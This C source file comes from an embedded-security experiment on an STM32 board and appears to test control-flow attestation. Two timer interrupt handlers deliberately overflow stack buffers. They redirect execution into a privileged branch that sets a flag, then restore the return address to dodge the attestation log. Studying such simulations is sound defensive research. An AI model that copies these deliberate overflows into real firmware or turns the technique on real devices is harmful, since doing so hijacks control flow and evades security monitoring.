/*
 * attack.h
 *
 *  Created on: Jun 16, 2022
 *      Author: aj4775
 */
#include "attack.h"
#include "main.h"
#include "secure_nsc.h"
#include <string.h>

extern TIM_HandleTypeDef htim2;
extern TIM_HandleTypeDef htim5;
void syncDebbugTimer(void);

int firstFlag2 = False;
int firstFlag5 = False;
int tAuth = False;

// Flag that will be attacked
int priviledgeflag = False;

// Variable that will carry the returning address of the interruption 1
uint32_t aReturnAddress;

// Flag just used to make the optimizer not ignore some part of the code
int neverChangeFlag = False;

void TIM5_IRQHandler(){

	/*
	 * Interruption 2 :
	 * 		This interruption interrupts the execution of the priviledged code before the log instruction
	 */

	// This if is just to ignore interruptions that happens before the main loop starts
	if (firstFlag5 == False) {
		HAL_TIM_IRQHandler(&htim5);
		return;
	}

	HAL_TIM_IRQHandler(&htim5);
	char redirectAddress[4];
	char vulnerability[1];


	redirectAddress[0] = (char) 0xFF & aReturnAddress;
	redirectAddress[1] = (char) 0xFF & aReturnAddress >> 8;
	redirectAddress[2] = (char) 0xFF & aReturnAddress >> 16;
	redirectAddress[3] = (char) 0xFF & aReturnAddress >> 24;

	// Buffer Overflow
	memcpy( vulnerability + 40, redirectAddress, 4 * sizeof(char));

	asm("nop"); // Add breakpoint here
}

void TIM2_IRQHandler(){
	/*
	 * Interruption 1 :
	 * 		This interruption uses a buffer overflow to redirect the execution inside the priviledged code
	 * 		it also sets another interruption to be triggered before the execution of the log function
	 */

	// This if is just to ignore interruptions that happens before the main loop starts
	if (firstFlag2 == False) {
		HAL_TIM_IRQHandler(&htim2);
		return;
	}

	// Reset IRQHandler flags
	HAL_TIM_IRQHandler(&htim2);

	// Put the variable on the stack
	char stringAttack[1];

	// Get Returning address of the interruption to be used by Interruption 2
	aReturnAddress = * ( (uint32_t*) (stringAttack + 36) );

	// Buffer Overflow Attack Simulation
	strcpy(stringAttack + 36 ,"\x27\x03\x04\x08");

	// Set timer to activate interruption 2
	SET_CLOCK(htim5,INTERRUPTION_MAX-39);

	asm("nop"); // Add breakpoint here

}


void mainLoop(){

	while(1){

		// Node 1
		SECURE_CFA_LOG(11);
		for(int i=0;i<50;i++){} // Random code execution simulation
		SECURE_CFA_LOG(12);

		// Node 2
		if(tAuth){
			SECURE_CFA_LOG(21);
			priviledgeflag = True;
			SECURE_CFA_LOG(22);
		}

		// Node 3
		SECURE_CFA_LOG(31);
		for(int i=0;i<50;i++){} // Random code execution simulation
		SECURE_CFA_LOG(32);

		asm("nop"); // Add breakpoint here
	}
}



// Utility

void syncDebbugTimer(){
	/* This code make the timer of the MCU stop counting when the
	 * Debbuger reach a breakpoint
	 */
	HAL_TIM_Base_Start_IT(&htim2);
	HAL_TIM_Base_Start_IT(&htim5);
	HAL_TIM_Base_Start(&htim2);
	HAL_TIM_Base_Start(&htim5);
	HAL_DBGMCU_EnableDBGStandbyMode();
	HAL_DBGMCU_EnableDBGStopMode();
	DBGMCU->APB1FZR1 |= DBGMCU_APB1FZR1_DBG_TIM2_STOP;
	DBGMCU->APB1FZR1 |= DBGMCU_APB1FZR1_DBG_TIM5_STOP;

}

void _init_(){
	syncDebbugTimer();
	firstFlag2 = True;
	firstFlag5 = True;
}

void initAttack(){
	_init_();
	mainLoop();
}
